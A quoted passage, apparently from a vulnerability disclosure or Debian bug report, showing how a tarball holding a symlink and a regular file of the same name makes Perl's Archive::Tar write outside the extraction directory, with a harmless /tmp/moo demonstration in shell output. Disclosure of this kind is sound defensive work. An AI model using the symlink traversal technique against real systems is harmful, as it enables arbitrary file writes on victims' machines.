However, you can bypass this > secure extraction mode easily by putting a symlink and a regular file > with the same name into the tarball. >  > I've attached proof of concept tarball, which makes Archive::Tar create > /tmp/moo, regardless of what the current working directory is: >  >   $ tar -tvvf traversal.tar.gz >   lrwxrwxrwx root/root         0 moo -> /tmp/moo >   -rw-r--r-- root/root         4 moo >  >   $ pwd >   /home/jwilk >  >   $ ls /tmp/moo >   ls: cannot access '/tmp/moo': No such file or directory >  >   $ perl -MArchive::Tar -e 'Archive::Tar->extract_archive("traversal.tar.gz")' >  >   $ ls /tmp/moo >   /tmp/moo  The mentioned proof of concept tarball is attached to the Debian bug at .
